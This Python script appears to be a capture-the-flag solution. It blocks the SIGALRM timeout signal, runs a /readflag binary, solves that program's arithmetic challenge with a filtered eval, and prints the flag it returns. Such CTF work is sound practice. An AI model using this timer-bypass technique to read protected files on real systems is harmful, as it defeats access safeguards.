import os
import signal
import subprocess
import time
import sys
import re

# Define the handler for the alarm signal (SIGALRM)
# We might not even need this if we block it, but good to have.
def alarm_handler(signum, frame):
    sys.stderr.write("Received SIGALRM, ignoring...\n")

def solve():
    try:
        # 1. Block SIGALRM to ignore the timeout
        # This is the critical step to bypass the 1ms timer
        try:
            signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
            sys.stderr.write("[*] SIGALRM blocked successfully\n")
        except AttributeError:
            sys.stderr.write("[!] signal.pthread_sigmask not available, trying signal.signal\n")
            signal.signal(signal.SIGALRM, signal.SIG_IGN)

        # 2. Start the /readflag binary
        process = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=0  # Unbuffered
        )

        # 3. Read the math challenge
        # Output format: "Please compute ... = ?"
        output = ""
        while True:
            char = process.stdout.read(1)
            if not char:
                break
            output += char
            if "=" in output and "?" in output:
                break
        
        sys.stderr.write(f"[*] Challenge received: {output}\n")

        # 4. Extract the expression
        # Example: "Please compute 123 + 456 = ?"
        # We need to find the equation.
        # It's usually the last line or close to it.
        match = re.search(r'(\d+(?:\s*[\+\-\*\/]\s*\d+)+)\s*=\s*\?', output)
        if match:
            expression = match.group(1)
            sys.stderr.write(f"[*] Expression: {expression}\n")
            
            # 5. Calculate the result
            # Security: Be careful with eval, but here we trust the binary (CTF context)
            # and we need to evaluate simple math.
            try:
                # Basic sanitation to ensure only digits and operators
                if not re.match(r'^[\d\s\+\-\*\/]+$', expression):
                    raise ValueError("Invalid characters in expression")
                
                result = int(eval(expression))
                sys.stderr.write(f"[*] Calculated result: {result}\n")
                
                # 6. Send the result back
                process.stdin.write(f"{result}\n")
                process.stdin.flush()
                
                # 7. Read the flag
                flag_output = process.stdout.read()
                sys.stderr.write(f"[+] Flag output: {flag_output}\n")
                print(f"FLAG_IS_HERE: {flag_output}")
                
            except Exception as e:
                sys.stderr.write(f"[!] Error evaluating: {e}\n")
        else:
            sys.stderr.write("[!] Could not find math expression in output\n")
            # Print remaining output just in case
            sys.stderr.write(process.stdout.read())

        process.wait()

    except Exception as e:
        sys.stderr.write(f"[!] Critical error: {e}\n")

if __name__ == "__main__":
    solve()
